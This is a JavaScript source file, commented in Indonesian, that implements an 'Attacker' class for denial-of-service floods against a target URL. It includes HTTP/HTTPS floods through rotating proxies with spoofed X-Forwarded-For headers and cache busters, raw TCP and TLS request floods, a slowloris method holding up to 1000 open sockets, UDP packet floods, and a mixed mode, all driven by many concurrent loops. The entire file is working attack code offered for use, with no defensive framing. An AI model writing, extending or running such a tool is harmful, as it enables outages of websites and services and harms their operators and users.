
// ============================================
// 🔥 ATTACKER ENGINE - LENGKAP DENGAN SEMUA METHOD 🔥
// ============================================

const axios = require('axios');
const net = require('net');
const tls = require('tls');
const dns = require('dns');
const { HttpsProxyAgent } = require('https-proxy-agent');
const { SocksProxyAgent } = require('socks-proxy-agent');
const config = require('../config');

class Attacker {
    constructor(target, threadCount, proxies = [], logger = null) {
        this.target = target;
        this.threadCount = threadCount;
        this.proxies = proxies;
        this.logger = logger;
        
        // Parse URL
        try {
            this.url = new URL(target);
            this.hostname = this.url.hostname;
            this.port = this.url.port || (this.url.protocol === 'https:' ? 443 : 80);
            this.path = this.url.pathname + this.url.search;
        } catch (err) {
            throw new Error(`Invalid target URL: ${target}`);
        }

        // Stats
        this.stats = {
            total: 0,
            success: 0,
            fail: 0,
            bytes: 0,
            startTime: Date.now(),
            target: target,
            threads: 0
        };

        // Status
        this.running = false;
        this.updateCallback = null;
        this.statsInterval = null;

        // DNS Cache
        this.dnsCache = new Map();
        this.dnsCacheTime = new Map();

        // Method handlers
        this.methods = {
            http: this.httpAttack.bind(this),
            https: this.httpsAttack.bind(this),
            socket: this.socketAttack.bind(this),
            tls: this.tlsAttack.bind(this),
            slowloris: this.slowlorisAttack.bind(this),
            udp: this.udpAttack.bind(this),
            mixed: this.mixedAttack.bind(this)
        };
    }

    // ============================================
    // PROXY METHODS
    // ============================================

    getRandomProxy() {
        if (!this.proxies || this.proxies.length === 0) return null;
        return this.proxies[Math.floor(Math.random() * this.proxies.length)];
    }

    createProxyAgent(proxy, protocol = 'http') {
        if (!proxy) return null;

        try {
            if (protocol === 'socks4' || protocol === 'socks5') {
                return new SocksProxyAgent(`${protocol}://${proxy}`);
            } else {
                return new HttpsProxyAgent(`http://${proxy}`);
            }
        } catch (err) {
            return null;
        }
    }

    // ============================================
    // DNS METHODS
    // ============================================

    async resolveDNS(hostname) {
        // Cek cache
        if (config.advanced.dnsCache) {
            const cached = this.dnsCache.get(hostname);
            const cacheTime = this.dnsCacheTime.get(hostname);
            
            if (cached && cacheTime && (Date.now() - cacheTime) < config.advanced.dnsCacheTTL) {
                return cached;
            }
        }

        // Resolve DNS
        return new Promise((resolve) => {
            dns.lookup(hostname, (err, address) => {
                if (!err && address) {
                    this.dnsCache.set(hostname, address);
                    this.dnsCacheTime.set(hostname, Date.now());
                    resolve(address);
                } else {
                    resolve(hostname);
                }
            });
        });
    }

    // ============================================
    // ATTACK METHODS
    // ============================================

    async httpAttack() {
        while (this.running) {
            try {
                const proxy = this.getRandomProxy();
                const agent = this.createProxyAgent(proxy);
                
                // Random headers
                const headers = {
                    'User-Agent': config.userAgents[Math.floor(Math.random() * config.userAgents.length)],
                    'Accept': config.headers.Accept,
                    'Accept-Language': config.headers['Accept-Language'],
                    'Referer': config.referers[Math.floor(Math.random() * config.referers.length)],
                    'Cache-Control': 'no-cache',
                    'Pragma': 'no-cache'
                };

                // Add random headers for bypass
                if (Math.random() > 0.5) {
                    headers['X-Forwarded-For'] = this.randomIP();
                    headers['X-Real-IP'] = this.randomIP();
                }

                // Random cache buster
                const cacheBuster = config.cacheBusters[Math.floor(Math.random() * config.cacheBusters.length)];
                const url = this.target + 
                    (this.target.includes('?') ? '&' : '?') + 
                    `${cacheBuster}=${Math.random().toString(36).substring(7)}&_=${Date.now()}`;

                const response = await axios({
                    method: 'GET',
                    url: url,
                    headers: headers,
                    httpsAgent: agent,
                    timeout: config.connection.timeout,
                    maxRedirects: config.advanced.maxRedirects,
                    validateStatus: config.advanced.validateStatus,
                    decompress: config.advanced.decompress
                });

                this.updateStats(response.status === 200 ? 'success' : 'fail', response.headers['content-length']);

            } catch (err) {
                this.updateStats('fail', 0);
            }
        }
    }

    async httpsAttack() {
        // Sama kayak httpAttack tapi khusus HTTPS
        await this.httpAttack();
    }

    async socketAttack() {
        while (this.running) {
            try {
                const ip = await this.resolveDNS(this.hostname);
                
                const socket = new net.Socket();
                socket.setTimeout(config.connection.timeout);

                socket.connect(this.port, ip, () => {
                    const request = [
                        `GET ${this.path} HTTP/1.1`,
                        `Host: ${this.hostname}`,
                        `User-Agent: ${config.userAgents[Math.floor(Math.random() * config.userAgents.length)]}`,
                        `Accept: ${config.headers.Accept}`,
                        `Accept-Language: ${config.headers['Accept-Language']}`,
                        `Connection: ${config.connection.keepAlive ? 'keep-alive' : 'close'}`,
                        '',
                        ''
                    ].join('\r\n');

                    socket.write(request);
                });

                socket.on('data', (data) => {
                    this.updateStats('success', data.length);
                    socket.destroy();
                });

                socket.on('error', () => {
                    this.updateStats('fail', 0);
                });

                socket.on('timeout', () => {
                    socket.destroy();
                    this.updateStats('fail', 0);
                });

            } catch (err) {
                this.updateStats('fail', 0);
            }
        }
    }

    async tlsAttack() {
        while (this.running) {
            try {
                const ip = await this.resolveDNS(this.hostname);
                
                const options = {
                    host: ip,
                    port: 443,
                    servername: this.hostname,
                    rejectUnauthorized: false,
                    timeout: config.connection.timeout
                };

                const socket = tls.connect(options, () => {
                    const request = [
                        `GET ${this.path} HTTP/1.1`,
                        `Host: ${this.hostname}`,
                        `User-Agent: ${config.userAgents[Math.floor(Math.random() * config.userAgents.length)]}`,
                        `Accept: ${config.headers.Accept}`,
                        `Connection: close`,
                        '',
                        ''
                    ].join('\r\n');

                    socket.write(request);
                });

                socket.on('data', (data) => {
                    this.updateStats('success', data.length);
                    socket.destroy();
                });

                socket.on('error', () => {
                    this.updateStats('fail', 0);
                });

                socket.on('timeout', () => {
                    socket.destroy();
                    this.updateStats('fail', 0);
                });

            } catch (err) {
                this.updateStats('fail', 0);
            }
        }
    }

    async slowlorisAttack() {
        const sockets = [];

        while (this.running) {
            try {
                if (sockets.length < 1000) {
                    const socket = new net.Socket();
                    
                    socket.connect(this.port, this.hostname, () => {
                        const request = [
                            `GET ${this.path} HTTP/1.1`,
                            `Host: ${this.hostname}`,
                            `User-Agent: ${config.userAgents[Math.floor(Math.random() * config.userAgents.length)]}`,
                            `Accept: ${config.headers.Accept}`,
                            `Connection: keep-alive`
                        ].join('\r\n') + '\r\n';

                        socket.write(request);
                        
                        // Kirim header random tiap 10 detik
                        const interval = setInterval(() => {
                            if (this.running) {
                                socket.write(`X-Random-${Math.random().toString(36)}: ${Math.random()}\r\n`);
                            } else {
                                clearInterval(interval);
                                socket.destroy();
                            }
                        }, 10000);

                        socket.interval = interval;
                    });

                    socket.on('error', () => {
                        const index = sockets.indexOf(socket);
                        if (index > -1) sockets.splice(index, 1);
                    });

                    sockets.push(socket);
                    this.updateStats('success', 0);
                } else {
                    await this.sleep(100);
                }

            } catch (err) {
                this.updateStats('fail', 0);
            }
        }

        // Cleanup
        for (const socket of sockets) {
            if (socket.interval) clearInterval(socket.interval);
            socket.destroy();
        }
    }

    async udpAttack() {
        const dgram = require('dgram');
        
        while (this.running) {
            try {
                const client = dgram.createSocket('udp4');
                const message = Buffer.from(this.randomString(1024));
                
                client.send(message, 0, message.length, this.port, this.hostname, (err) => {
                    if (err) {
                        this.updateStats('fail', 0);
                    } else {
                        this.updateStats('success', message.length);
                    }
                    client.close();
                });

            } catch (err) {
                this.updateStats('fail', 0);
            }
        }
    }

    async mixedAttack() {
        const methods = ['http', 'socket', 'slowloris'];
        const method = methods[Math.floor(Math.random() * methods.length)];
        
        switch(method) {
            case 'http':
                await this.httpAttack();
                break;
            case 'socket':
                await this.socketAttack();
                break;
            case 'slowloris':
                await this.slowlorisAttack();
                break;
        }
    }

    // ============================================
    // UTILITY METHODS
    // ============================================

    randomIP() {
        return `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`;
    }

    randomString(length) {
        const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
        let result = '';
        for (let i = 0; i < length; i++) {
            result += chars.charAt(Math.floor(Math.random() * chars.length));
        }
        return result;
    }

    sleep(ms) {
        return new Promise(resolve => setTimeout(resolve, ms));
    }

    updateStats(status, bytes) {
        this.stats.total++;
        if (status === 'success') {
            this.stats.success++;
            this.stats.bytes += bytes || 0;
        } else {
            this.stats.fail++;
        }
    }

    // ============================================
    // MAIN METHODS
    // ============================================

    start(method = 'mixed', updateCallback = null) {
        this.running = true;
        this.updateCallback = updateCallback;
        this.stats.startTime = Date.now();

        // Pilih method
        const attackMethod = this.methods[method] || this.methods.mixed;

        // Start threads
        for (let i = 0; i < this.threadCount; i++) {
            setTimeout(() => attackMethod(), i * 10);
        }
        this.stats.threads = this.threadCount;

        // Log start
        if (this.logger) {
            this.logger.log(`Attack started on ${this.target} with ${this.threadCount} threads using ${method} method`);
        }

        // Stats interval
        this.statsInterval = setInterval(() => {
            if (this.updateCallback) {
                const elapsed = (Date.now() - this.stats.startTime) / 1000;
                const rate = this.stats.total / elapsed;
                
                this.updateCallback({
                    elapsed: Math.floor(elapsed),
                    total: this.stats.total.toLocaleString(),
                    success: this.stats.success.toLocaleString(),
                    fail: this.stats.fail.toLocaleString(),
                    rate: Math.floor(rate),
                    bytes: (this.stats.bytes / 1024 / 1024).toFixed(2),
                    threads: this.threadCount,
                    target: this.target
                });
            }
        }, 5000);
    }

    stop() {
        this.running = false;
        clearInterval(this.statsInterval);
        
        if (this.logger) {
            this.logger.log(`Attack stopped on ${this.target}`);
        }
    }

    getStats() {
        const elapsed = (Date.now() - this.stats.startTime) / 1000;
        const rate = this.stats.total / elapsed;
        
        return {
            target: this.target,
            elapsed: Math.floor(elapsed),
            total: this.stats.total,
            success: this.stats.success,
            fail: this.stats.fail,
            rate: Math.floor(rate),
            bytes: (this.stats.bytes / 1024 / 1024).toFixed(2),
            threads: this.threadCount,
            running: this.running
        };
    }
}

module.exports = Attacker;
